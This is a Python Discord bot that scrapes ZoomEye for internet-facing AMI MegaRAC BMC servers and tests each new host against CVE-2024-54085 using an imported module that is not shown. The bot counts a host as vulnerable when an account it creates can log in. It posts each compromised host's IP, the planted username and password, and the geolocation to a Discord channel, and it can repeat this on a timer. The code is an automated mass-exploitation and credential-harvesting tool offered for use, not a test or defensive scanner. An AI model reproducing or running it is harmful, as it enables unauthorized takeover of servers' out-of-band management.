#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
MegaRAC CVE-2024-54085 — ZoomEye IP scraper Discord bot.

Flow: scrape (ZoomEye) -> filter new -> liveness -> 100% vuln check (mcve.py)
      -> post to Discord -> persist state.
"""

import os
import json
import asyncio
from datetime import datetime
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor

import discord
from discord.ext import commands, tasks
from dotenv import load_dotenv

import scraper
import mcve

# --------------------- CONFIG --------------------- #
load_dotenv()

TOKEN            = os.getenv("DISCORD_TOKEN", "")
CHANNEL_ID       = int(os.getenv("DISCORD_CHANNEL_ID", "0"))
DORK             = os.getenv("DORK", 'ssl.cert.issuer.cn="megarac.com" && app="lighttpd" && country!="CN" && port="443"')
MAX_PAGES        = int(os.getenv("MAX_PAGES", "3"))
PAGESIZE         = int(os.getenv("PAGESIZE", "100"))
VERIFY_WORKERS   = int(os.getenv("VERIFY_WORKERS", "150"))
SCAN_INTERVAL_MIN= float(os.getenv("SCAN_INTERVAL_MIN", "30"))
PREFIX           = os.getenv("BOT_PREFIX", "!")

SEEN_FILE = Path("seen_ips.json")
VULN_FILE = Path("vulnerable.json")

seen_ips: set = set()      # every ip we have ever scraped
vulns: dict = {}           # url -> record
scan_lock = asyncio.Lock()

# --------------------- STATE --------------------- #
def load_state():
    global seen_ips, vulns
    if SEEN_FILE.exists():
        try:
            seen_ips = set(json.loads(SEEN_FILE.read_text()))
        except Exception:
            seen_ips = set()
    if VULN_FILE.exists():
        try:
            vulns = {v["ip"]: v for v in json.loads(VULN_FILE.read_text())}
        except Exception:
            vulns = {}

def save_state():
    SEEN_FILE.write_text(json.dumps(sorted(seen_ips), indent=2))
    VULN_FILE.write_text(json.dumps(list(vulns.values()), indent=2))

# --------------------- CORE CYCLE (blocking, run in a thread) --------------------- #
def _check_one(ip: str):
    """Return ('vuln', record) | ('alive', ip) | ('dead', ip)."""
    res = mcve.check_ip(ip)
    if res:
        url, user, pwd, geo = res
        return ("vuln", {"ip": url, "user": user, "pass": pwd,
                          "geo": geo, "time": datetime.now().isoformat()})
    if mcve.is_alive(ip):
        return ("alive", ip)
    return ("dead", ip)

def _run_cycle_sync() -> dict:
    report = {"scraped": 0, "new": [], "alive": [], "vulns": []}

    # 1) scrape
    ips = scraper.collect_ips(DORK, max_pages=MAX_PAGES, pagesize=PAGESIZE)
    report["scraped"] = len(ips)

    # 2) only brand new ips
    new = [ip for ip in ips if ip not in seen_ips]
    report["new"] = new
    seen_ips.update(ips)

    if not new:
        save_state()
        return report

    # 3) liveness + 4) 100% vuln check (single pass)
    with ThreadPoolExecutor(max_workers=VERIFY_WORKERS) as ex:
        for kind, payload in ex.map(_check_one, new):
            if kind == "vuln":
                report["vulns"].append(payload)
                vulns[payload["ip"]] = payload
            elif kind == "alive":
                report["alive"].append(payload)

    save_state()
    return report

# --------------------- FORMATTING --------------------- #
def _chunk(text: str, size: int = 1900):
    for i in range(0, len(text), size):
        yield text[i:i + size]

def format_report(report: dict) -> str:
    lines = []
    lines.append(f"MegaRAC scan @ {datetime.now():%Y-%m-%d %H:%M:%S}")
    lines.append(f"Dork: {DORK}")
    lines.append(
        f"Scraped: {report['scraped']} | New: {len(report['new'])} | "
        f"Alive: {len(report['alive'])} | VULNERABLE: {len(report['vulns'])}"
    )

    if report["vulns"]:
        lines.append("")
        lines.append("== VULNERABLE (100%: account created + login OK) ==")
        for v in report["vulns"]:
            lines.append(f"{v['ip']}  |  {v['user']}:{v['pass']}  |  {v['geo']}")

    if report["alive"]:
        lines.append("")
        lines.append("== NEW LIVE (not vulnerable) ==")
        lines.append(" ".join(report["alive"]))

    if not report["vulns"] and not report["alive"]:
        lines.append("No new live/vulnerable hosts this cycle.")

    return "\n".join(lines)

# --------------------- DISCORD --------------------- #
intents = discord.Intents.default()
intents.message_content = True

bot = commands.Bot(command_prefix=PREFIX, intents=intents)

async def do_scan(auto: bool = False):
    if scan_lock.locked():
        return
    async with scan_lock:
        channel = bot.get_channel(CHANNEL_ID)
        if channel is None:
            print(f"[!] Channel {CHANNEL_ID} not found")
            return
        try:
            report = await asyncio.to_thread(_run_cycle_sync)
        except Exception as e:
            await channel.send(f"Scan error: {e}")
            return
        text = format_report(report)
        for chunk in _chunk(text):
            await channel.send(chunk)

@tasks.loop(minutes=SCAN_INTERVAL_MIN)
async def scan_loop():
    await do_scan(auto=True)

@bot.event
async def on_ready():
    load_state()
    print(f"Logged in as {bot.user} | channel={CHANNEL_ID} | interval={SCAN_INTERVAL_MIN}m")
    if not scan_loop.is_running():
        scan_loop.start()

# --------------------- COMMANDS --------------------- #
@bot.command(name="scan")
async def cmd_scan(ctx):
    """Run one scan cycle now."""
    await ctx.send("Scanning ZoomEye + verifying... (this can take a while)")
    await do_scan()

@bot.command(name="loop")
async def cmd_loop(ctx):
    """Toggle the automatic periodic scan on/off."""
    if scan_loop.is_running():
        scan_loop.cancel()
        await ctx.send("Auto-scan loop STOPPED.")
    else:
        scan_loop.start()
        await ctx.send(f"Auto-scan loop STARTED (every {SCAN_INTERVAL_MIN} min).")

@bot.command(name="status")
async def cmd_status(ctx):
    """Show bot status."""
    await ctx.send(
        f"Auto-loop: {'RUNNING' if scan_loop.is_running() else 'STOPPED'}\n"
        f"Interval: {SCAN_INTERVAL_MIN} min | Seen IPs: {len(seen_ips)} | Vulnerable: {len(vulns)}"
    )

@bot.command(name="vulns")
async def cmd_vulns(ctx):
    """List all vulnerable hosts found so far."""
    if not vulns:
        await ctx.send("No vulnerable hosts yet.")
        return
    lines = [f"{v['ip']}  |  {v['user']}:{v['pass']}  |  {v['geo']}" for v in vulns.values()]
    for chunk in _chunk("VULNERABLE HOSTS:\n" + "\n".join(lines)):
        await ctx.send(chunk)

@bot.command(name="ips")
async def cmd_ips(ctx):
    """List all scraped IPs (newest state)."""
    if not seen_ips:
        await ctx.send("No IPs scraped yet.")
        return
    for chunk in _chunk("SEEN IPs:\n" + " ".join(sorted(seen_ips))):
        await ctx.send(chunk)

# --------------------- MAIN --------------------- #
if __name__ == "__main__":
    if not TOKEN:
        raise SystemExit("Set DISCORD_TOKEN in .env")
    if not CHANNEL_ID:
        raise SystemExit("Set DISCORD_CHANNEL_ID in .env")
    if not os.getenv("ZOOMEYE_API_KEY"):
        print("[!] Warning: ZOOMEYE_API_KEY is empty - the free plan has no API access.")
    bot.run(TOKEN)
